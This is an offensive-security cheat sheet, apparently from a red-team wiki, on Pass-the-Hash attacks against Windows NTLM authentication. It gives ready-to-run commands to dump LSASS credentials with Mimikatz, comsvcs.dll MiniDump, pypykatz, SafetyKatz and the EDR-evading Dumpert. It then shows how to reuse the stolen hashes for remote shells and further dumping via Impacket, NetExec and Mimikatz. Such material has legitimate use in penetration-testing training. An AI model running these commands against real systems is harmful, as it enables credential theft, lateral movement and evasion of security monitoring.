**Pass-the-Hash (PTH)** is a technique where an attacker authenticates to a remote system or service using the password hash rather than the plaintext password. This exploits the NTLM authentication protocol. **Unlike Overpass-the-Hash, standard PTH is used for local authentication or non-domain contexts.**

<Callout type="info" title="MITRE ATT&CK Mapping">
* [T1550.002 - Use Alternate Authentication Material: Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
* [T1003 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)

```mermaid
%%{init: {'theme': 'base', 'themeVariables': { 'background': '#050505', 'primaryColor': '#1e1e2e', 'edgeLabelBackground':'#050505', 'primaryTextColor': '#cdd6f4', 'primaryBorderColor': '#FF003C', 'lineColor': '#FF003C', 'fontFamily': 'monospace'}}}%%
flowchart LR
    A["LSASS Process"] -->|"1. Dump Memory"| B["lsass.dmp"]
    B -->|"2. Parse & Extract"| C["NTLM Hash"]
    C -->|"3. Pass-the-Hash"| D["Target System (SMB/WMI)"]
    
    classDef default fill:#111118,stroke:#FF003C,stroke-width:1px,color:#ffffff;
    classDef attacker fill:#2a0008,stroke:#FF003C,stroke-width:2px,color:#FF003C;
    class C,D attacker;
```

</Callout>




## Prerequisite: Credential Dumping

<Callout type="warning" title="Extracting Hashes from Memory (LSASS)">
To perform a PTH attack, you must first obtain the NTLM hash. This requires dumping credentials from the Local Security Authority Subsystem Service (LSASS) memory.
</Callout>

<Tabs>
  <Tab title="Mimikatz">
    The most well-known tool for credential dumping in Windows environments. It extracts plaintext passwords, hashes, and Kerberos tickets.
    ```powershell
    # Dump encryption keys (NTLM/AES) from memory
    Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
    ```
  </Tab>
  <Tab title="Rundll32 & comsvcs.dll (LOLBAS)">
    A "Living Off The Land" technique to dump LSASS memory using built-in Windows DLLs without dropping Mimikatz on disk. Requires Administrator privileges.
    ```powershell
    # 1. Find the LSASS Process ID
    tasklist /FI "IMAGENAME eq lsass.exe"
    Get-Process lsass | Select-Object Id

    # 2. Dump LSASS memory using comsvcs.dll (Replace <lsassID>)
    rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump <lsassID> C:\Users\Public\lsass.dmp full
    ```
  </Tab>
  <Tab title="Pypykatz (Python)">
    Mimikatz functionality written in Python. It can be used to parse offline dumps or run live extraction.
    ```powershell
    # Live extraction from LSA
    pypykatz.exe live lsa
    ```
  </Tab>
  <Tab title="SafetyKatz & Dumpert (Evasion)">
    <Callout type="danger" title="EDR Evasion">
    **SafetyKatz:** Creates a Minidump of LSASS and uses a custom PE Loader to run Mimikatz in memory.
    ```powershell
    SafetyKatz.exe sekurlsa::ekeys
    ```
    **Dumpert:** Uses Direct System Calls (Syscalls) and API unhooking to bypass EDR/AV sensors during the dump.
    ```powershell
    rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
    ```
    </Callout>
  </Tab>
  <Tab title="Linux Credential Dumping">
    For Linux targets or remote attacks, the **Impacket** suite (Python) is the standard tool for dumping credentials (e.g., extracting hashes from SAM or NTDS.dit remotely).
  </Tab>
</Tabs>

---

## Executing Pass-the-Hash (Using the Hash)

<Callout type="success" title="Performing the Attack">
Once you have the NTLM hash, you can use it to authenticate to remote services (like SMB or WMI) without needing the plaintext password.
</Callout>

<Tabs>
  <Tab title="Impacket (Linux)">
    ```bash
    # Pass-the-Hash to spawn a semi-interactive shell via WMI
    impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_HASH> Administrator@10.10.10.10

    # Pass-the-Hash to dump SAM hashes remotely
    impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrator@10.10.10.10
    ```
  </Tab>
  <Tab title="NetExec (Linux)">
    ```bash
    # Validate hashes and execute commands via SMB
    nxc smb 10.10.10.10 -u Administrator -H <NTLM_HASH> -x "whoami"
    ```
  </Tab>
  <Tab title="Mimikatz (Windows)">
    ```cmd
    mimikatz # sekurlsa::pth /user:Administrator /ntlm:<NTLM_HASH> /run:cmd.exe
    ```
  </Tab>
</Tabs>
